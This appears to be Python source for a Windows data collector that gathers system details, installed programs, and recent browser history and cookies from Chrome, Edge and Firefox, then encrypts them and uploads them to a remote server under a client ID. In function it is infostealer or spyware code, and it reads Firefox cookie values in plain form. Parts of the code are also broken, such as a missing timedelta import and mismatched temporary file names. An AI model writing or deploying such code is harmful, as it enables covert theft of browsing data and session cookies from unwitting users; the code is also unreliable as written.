import platform
import psutil
import socket
import json
import time
import logging
import subprocess
import os
import getpass
import sqlite3
import winreg
from datetime import datetime
from config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator, CommunicationError

# Setup logging
LOG_FILE = "collector.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler()
    ]
)

class SystemCollector:
    def __init__(self):
        self.logger = logging.getLogger("SystemCollector")
        self.client_id = Config.get_client_id()
        self.encryption_manager = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption_manager)
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "client_id": self.client_id,
            "browser_data": {},
            "installed_programs": [],
            "system_info": {}
        }

    def _run_command(self, cmd: list, timeout: int = 30) -> dict:
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {"status": "success", "stdout": result.stdout, "stderr": result.stderr}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "stdout": e.stdout, "stderr": e.stderr}
        except Exception as e:
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def collect_system_info(self):
        self.logger.info("Collecting system information...")
        try:
            self.results["system_info"] = {
                "os_name": platform.system(),
                "os_version": platform.version(),
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "ram_total_mb": round(psutil.virtual_memory().total / (1024 * 1024), 2)
            }
            self.logger.info("System information collected successfully")
        except Exception as e:
            self.results["system_info"]["error"] = str(e)
            self.logger.error(f"Failed to collect system info: {str(e)}")

    def collect_browser_data(self):
        self.logger.info("Collecting browser data...")
        try:
            browser_data = {
                "chrome": {"history": [], "cookies": []},
                "firefox": {"history": [], "cookies": []},
                "edge": {"history": [], "cookies": []}
            }

            # Chrome
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
            if os.path.exists(chrome_path):
                browser_data["chrome"] = self._get_browser_data(chrome_path, "Chrome")

            # Firefox
            firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    places_path = os.path.join(firefox_path, profile, "places.sqlite")
                    if os.path.exists(places_path):
                        browser_data["firefox"] = self._get_browser_data(places_path, "Firefox")
                        break

            # Edge
            edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
            if os.path.exists(edge_path):
                browser_data["edge"] = self._get_browser_data(edge_path, "Edge")

            self.results["browser_data"] = browser_data
            self.logger.info(f"Browser data collected: Chrome ({len(browser_data['chrome']['history'])} history entries), "
                            f"Firefox ({len(browser_data['firefox']['history'])} history entries), "
                            f"Edge ({len(browser_data['edge']['history'])} history entries)")
        except Exception as e:
            self.results["browser_data"]["error"] = str(e)
            self.logger.error(f"Failed to collect browser data: {str(e)}")

    def _get_browser_data(self, db_path: str, browser: str) -> dict:
        try:
            # Create a temporary copy of the database to avoid locking issues
            temp_db = f"temp_{browser.lower()}_db_{int(time.time())}.sqlite"
            with open(db_path, 'rb') as src, open(temp_db, 'wb') as dst:
                dst.write(src.read())

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            # Collect history
            history = []
            try:
                if browser == "Firefox":
                    cursor.execute("SELECT url, title, visit_date/1000000 as visit_time FROM moz_historyvisits JOIN moz_places ON moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC LIMIT 100")
                else:
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                for row in cursor.fetchall():
                    visit_time = row['last_visit_time'] if browser != "Firefox" else row['visit_time']
                    if browser != "Firefox":
                        # Convert Chrome/Edge timestamp (Windows FILETIME) to readable format
                        visit_time = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                    else:
                        visit_time = datetime.fromtimestamp(visit_time)
                    history.append({
                        "url": row['url'],
                        "title": row['title'] or "No title",
                        "visit_time": visit_time.isoformat()
                    })
            except Exception as e:
                self.logger.error(f"Failed to collect {browser} history: {str(e)}")

            # Collect cookies
            cookies = []
            try:
                if browser == "Firefox":
                    cursor.execute("SELECT host, name, value, last_accessed/1000000 as last_accessed FROM moz_cookies ORDER BY last_accessed DESC LIMIT 100")
                else:
                    cookie_path = os.path.join(os.path.dirname(db_path), "Cookies")
                    if os.path.exists(cookie_path):
                        with open(cookie_path, 'rb') as src, open(f"temp_{browser.lower()}_cookies_{int(time.time())}.sqlite", 'wb') as dst:
                            dst.write(src.read())
                        cookie_conn = sqlite3.connect(f"temp_{browser.lower()}_cookies_{int(time.time())}.sqlite")
                        cookie_cursor = cookie_conn.cursor()
                        cookie_cursor.execute("SELECT host_key, name, encrypted_value, last_access_utc FROM cookies ORDER BY last_access_utc DESC LIMIT 100")
                        for row in cookie_cursor.fetchall():
                            cookies.append({
                                "host": row['host_key'],
                                "name": row['name'],
                                "value": "Encrypted" if browser != "Firefox" else row['value'],
                                "last_accessed": (datetime(1601, 1, 1) + timedelta(microseconds=row['last_access_utc'])).isoformat() if browser != "Firefox" else datetime.fromtimestamp(row['last_accessed']).isoformat()
                            })
                        cookie_conn.close()
                        os.remove(f"temp_{browser.lower()}_cookies_{int(time.time())}.sqlite")
            except Exception as e:
                self.logger.error(f"Failed to collect {browser} cookies: {str(e)}")

            conn.close()
            os.remove(temp_db)
            return {"history": history, "cookies": cookies}
        except Exception as e:
            self.logger.error(f"Failed to process {browser} database: {str(e)}")
            return {"history": [], "cookies": [], "error": str(e)}

    def collect_installed_programs(self):
        self.logger.info("Collecting installed programs...")
        try:
            programs = []
            reg_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            for reg_path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            version, _ = winreg.QueryValueEx(subkey, "DisplayVersion") if "DisplayVersion" in [winreg.QueryValueEx(subkey, n)[1] for n in winreg.EnumValue(subkey)] else ("N/A", None)
                            publisher, _ = winreg.QueryValueEx(subkey, "Publisher") if "Publisher" in [winreg.QueryValueEx(subkey, n)[1] for n in winreg.EnumValue(subkey)] else ("N/A", None)
                            install_date, _ = winreg.QueryValueEx(subkey, "InstallDate") if "InstallDate" in [winreg.QueryValueEx(subkey, n)[1] for n in winreg.EnumValue(subkey)] else ("N/A", None)
                            programs.append({
                                "name": display_name,
                                "version": version,
                                "publisher": publisher,
                                "install_date": install_date
                            })
                        except FileNotFoundError:
                            continue
                        winreg.CloseKey(subkey)
                    winreg.CloseKey(key)
                except Exception as e:
                    self.logger.error(f"Failed to read registry path {reg_path}: {str(e)}")
            self.results["installed_programs"] = programs
            self.logger.info(f"Collected {len(programs)} installed programs")
        except Exception as e:
            self.results["installed_programs"] = {"error": str(e)}
            self.logger.error(f"Failed to collect installed programs: {str(e)}")

    def send_data(self):
        self.logger.info("Sending collected data to server...")
        try:
            # Encrypt and send browser data
            encrypted_browser_data = self.encryption_manager.encrypt(json.dumps(self.results["browser_data"]))
            browser_response = self.communicator._send_request(
                "action=upload_browser_data",
                data={
                    "client_id": self.client_id,
                    "browser_data": encrypted_browser_data
                }
            )
            self.logger.info(f"Browser data sent: {browser_response}")

            # Encrypt and send installed programs
            encrypted_programs = self.encryption_manager.encrypt(json.dumps(self.results["installed_programs"]))
            programs_response = self.communicator._send_request(
                "action=upload_installed_programs",
                data={
                    "client_id": self.client_id,
                    "installed_programs": encrypted_programs
                }
            )
            self.logger.info(f"Installed programs sent: {programs_response}")

            # Encrypt and send system info
            encrypted_system_info = self.encryption_manager.encrypt(json.dumps(self.results["system_info"]))
            system_response = self.communicator._send_request(
                "action=upload_data",
                data={
                    "client_id": self.client_id,
                    "system_info": encrypted_system_info
                }
            )
            self.logger.info(f"System info sent: {system_response}")

        except CommunicationError as e:
            self.logger.error(f"Failed to send data: {str(e)}")

    def run(self):
        self.logger.info("Starting system data collection...")
        self.collect_system_info()
        self.collect_browser_data()
        self.collect_installed_programs()
        self.send_data()
        self.logger.info("System data collection and upload completed")

if __name__ == "__main__":
    collector = SystemCollector()
    collector.run()